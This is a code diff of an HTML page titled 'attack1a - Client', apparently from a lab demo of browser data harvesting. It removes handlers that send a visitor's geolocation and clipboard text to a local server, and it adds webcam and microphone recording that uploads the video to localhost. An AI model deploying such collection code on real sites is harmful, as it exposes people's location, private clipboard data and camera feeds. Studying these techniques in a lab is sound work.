@@ -20,102 +20,64 @@
     <h1>attack1a - Client</h1>
     <button id="sendLocation" class="btn btn-primary">Send IP and Geolocation</button>
     <button id="sendClipboard" class="btn btn-secondary">Send Clipboard Content</button>
+    <button id="startRecording" class="btn btn-success">Start Recording</button>
+    <button id="stopRecording" class="btn btn-danger" disabled>Stop Recording</button>
   </div>
 
   <script>
-    // Button 1: Send IP and Geolocation
-    // Button: Send IP and Geolocation with Enhanced Debugging
-    document.getElementById('sendLocation').addEventListener('click', function () {
-      // Check if the browser supports Geolocation API
-      if (!navigator.geolocation) {
-        console.error('Geolocation is not supported by your browser.');
-        return;
-      }
+    let mediaRecorder;
+    let recordedChunks = [];
 
-      // Start retrieving geolocation
-      console.log('Requesting geolocation permission...');
+    // Start Recording Button
+    document.getElementById('startRecording').addEventListener('click', async function () {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-      navigator.geolocation.getCurrentPosition(
-        async function (position) {
-          // Successfully retrieved geolocation
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const mapLink = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
-          console.log(`Geolocation retrieved: Latitude: ${latitude}, Longitude: ${longitude}`);
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.start();
 
-          // Prepare data to send to server
-          const geolocationData = {
-            latitude,
-            longitude,
-            mapLink,
-            timestamp: new Date().toISOString()
-          };
-          console.log('Sending geolocation data to server:', geolocationData);
+        mediaRecorder.ondataavailable = function (event) {
+          if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
 
-          // Send geolocation to the server
+        mediaRecorder.onstop = async function () {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('video', blob, 'recording.webm');
+
           try {
-            const response = await fetch('http://localhost:3000/receive-location', {
+            const response = await fetch('http://localhost:3000/upload-video', {
               method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(geolocationData)
+              body: formData
             });
-
-            if (!response.ok) {
-              throw new Error(`Server responded with status: ${response.status}`);
-            }
-
-            const responseData = await response.json();
-            console.log('Server response:', responseData);
+            const result = await response.json();
+            console.log('Server response:', result);
           } catch (error) {
-            console.error('Error sending geolocation data to server:', error);
+            console.error('Error uploading video:', error);
           }
-        },
-        function (error) {
-          // Handle geolocation errors
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              console.error('User denied the request for Geolocation.');
-              break;
-            case error.POSITION_UNAVAILABLE:
-              console.error('Location information is unavailable.');
-              break;
-            case error.TIMEOUT:
-              console.error('The request to get user location timed out.');
-              break;
-            default:
-              console.error('An unknown error occurred during geolocation retrieval:', error);
-              break;
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
+
+          // Clear recorded data for the next recording
+          recordedChunks = [];
+        };
+
+        document.getElementById('stopRecording').disabled = false;
+        document.getElementById('startRecording').disabled = true;
+        console.log('Recording started...');
+      } catch (error) {
+        console.error('Failed to start recording:', error);
+      }
     });
 
+    // Stop Recording Button
+    document.getElementById('stopRecording').addEventListener('click', function () {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+        console.log('Recording stopped.');
 
-    // Button 2: Send Clipboard Content
-    document.getElementById('sendClipboard').addEventListener('click', async function () {
-      try {
-        const clipboardText = await navigator.clipboard.readText();
-
-        // Send clipboard content to the server
-        fetch('http://localhost:3000/receive-clipboard', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ clipboardContent: clipboardText })
-        })
-          .then(response => response.json())
-          .then(data => console.log('Clipboard content sent:', data))
-          .catch(error => console.error('Error sending clipboard content:', error));
-      } catch (error) {
-        console.error('Failed to read clipboard:', error);
+        document.getElementById('stopRecording').disabled = true;
+        document.getElementById('startRecording').disabled = false;
       }
     });
   </script>
